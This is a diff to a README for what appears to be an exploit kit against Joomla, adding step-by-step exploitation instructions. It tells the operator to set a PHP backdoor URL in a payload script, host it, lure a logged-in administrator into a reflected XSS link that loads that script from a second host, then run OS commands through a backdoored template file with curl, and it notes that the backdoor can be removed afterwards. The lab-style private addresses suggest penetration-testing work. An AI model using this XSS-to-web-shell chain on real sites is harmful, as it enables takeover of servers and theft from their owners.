@@ -10,26 +10,44 @@
 
 ## Exploitation Steps
 
-1. victim user (with administrative privileges) logs in
+1. [setup exploit] change payload variable values (`patchFileJoomla.js`)
 
-http://192.168.5.19/administrator
+    `phpBdURL` - URL of PHP backdoor to be installed on target site
 
-2. victim user clicks link
+    `joomlaRoot` - path to Joomla installation on the target system (e.g. `"/path"`)
 
-```
-http://192.168.5.19/test/rxss.php?q=<script src=http://192.168.5.13/patchFileJoomla.js></script>
-```
+2. [setup exploit] setup web server (to serve the payload/backdoor)
 
-3. execute OS command
+    * **NOTE**: update/customize PHP backdoor in `bd.txt`
 
-```
-curl "http://192.168.5.19/templates/cassiopeia/error.php?pass=test&cmd=id"
-```
+3. [social engineering attack] victim user (with administrative privileges) logs in
 
-4. [optional] restore file
+    http://192.168.5.19/administrator
 
-*Joomla ➔ System ➔ [Templates] Site Templates ➔ Cassiopeia Details and Files ➔ [tab] Editor ➔ /templlates/cassiopeia - error.php ➔ (remove backdoor) ➔ Save & Close*
+4. [social engineering attack] victim user clicks link
+
+    ```
+    http://192.168.5.19/test/rxss.php?q=<script src=http://192.168.5.13/patchFileJoomla.js></script>
+    ```
+
+    * **NOTES**:
+      * `192.168.5.19` - target Joomla site
+      * `192.168.5.13` - web server hosting payload
+
+5. [post exploit] execute OS command
+
+    ```
+    curl "http://192.168.5.19/templates/cassiopeia/error.php?pass=test&cmd=id"
+    ```
+
+    * **NOTE**: endpoint URL constructed based on exfiltrated data (obtained via `GET` request, when fetching `bd.txt`)
+
+6. [restore file] restore file via GUI
+
+    *Joomla ➔ System ➔ [Templates] Site Templates ➔ Cassiopeia Details and Files ➔ [tab] Editor ➔ /templlates/cassiopeia - error.php ➔ (remove backdoor) ➔ Save & Close*
 
 ## Screenshots
+
+* **NOTE**: the screenshot covers steps 1 to 5 from the "Exploitation Steps" chapter
 
 ![Image](screenshots/Joomla_-_patch_file_-_1-1.png)
